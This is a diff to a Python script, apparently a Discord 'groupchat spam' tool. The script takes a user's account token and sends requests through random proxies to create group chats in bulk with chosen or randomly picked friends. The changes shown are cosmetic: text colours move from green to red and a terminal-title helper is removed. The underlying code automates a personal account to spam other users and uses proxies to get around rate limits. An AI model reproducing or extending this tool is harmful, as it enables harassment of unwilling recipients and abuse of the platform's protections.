@@ -1,7 +1,7 @@
 import requests
 import random
 from time import sleep
-from pystyle import Colors, Colorate
+from pystyle import Colors
 
 def clear():
     print("\033c", end="")
@@ -17,9 +17,6 @@ def getheaders(token):
 
 def handle_error(message):
     print(f"{Colors.red}Error: {message}{Colors.reset}")
-
-def set_title(title):
-    print(f"\033]0;{title}\007")
 
 def main():
     clear()
@@ -50,7 +47,7 @@ def randomizer(token, ID):
             response = requests.post('https://discordapp.com/api/v9/users/@me/channels', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={"recipients": users})
 
             if response.status_code in [200, 204]:
-                print(f"{Colors.green}Created groupchat{Colors.reset}")
+                print(f"{Colors.red}Created groupchat{Colors.reset}")
             elif response.status_code == 429:
                 print(f"{Colors.red}Rate limited ({response.json().get('retry_after', 'N/A')}ms){Colors.reset}")
             else:
@@ -66,8 +63,8 @@ token = input(f"{Colors.red}Your Account Token: {Colors.reset}")
 
 print(f'\n{Colors.red}Do you want to choose user(s) yourself to groupchat spam or do you want to select randoms?{Colors.reset}')
 print(f'''
-[01] {Colors.green}Choose user(s) yourself{Colors.reset}
-[02] {Colors.green}Randomize the users{Colors.reset}
+[01] {Colors.red}Choose user(s) yourself{Colors.reset}
+[02] {Colors.red}Randomize the users{Colors.reset}
                     ''')
 try:
     secondchoice = int(input(f'{Colors.red}Choice: {Colors.reset}'))
@@ -80,7 +77,6 @@ if secondchoice not in [1, 2]:
     main()
 
 if secondchoice == 1:
-    set_title("Creating groupchats")
     print(f'\n{Colors.red}Input the users you want to create a groupchat with (separate by , id,id2,id3){Colors.reset}')
     recipients = input(f'{Colors.red}Users ID: {Colors.reset}')
     user = recipients.split(',')
@@ -91,7 +87,6 @@ if secondchoice == 1:
     selector(token, user)
 
 elif secondchoice == 2:
-    set_title("Creating groupchats")
     IDs = []
     try:
         friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'http://{proxy()}'}, headers=getheaders(token)).json()
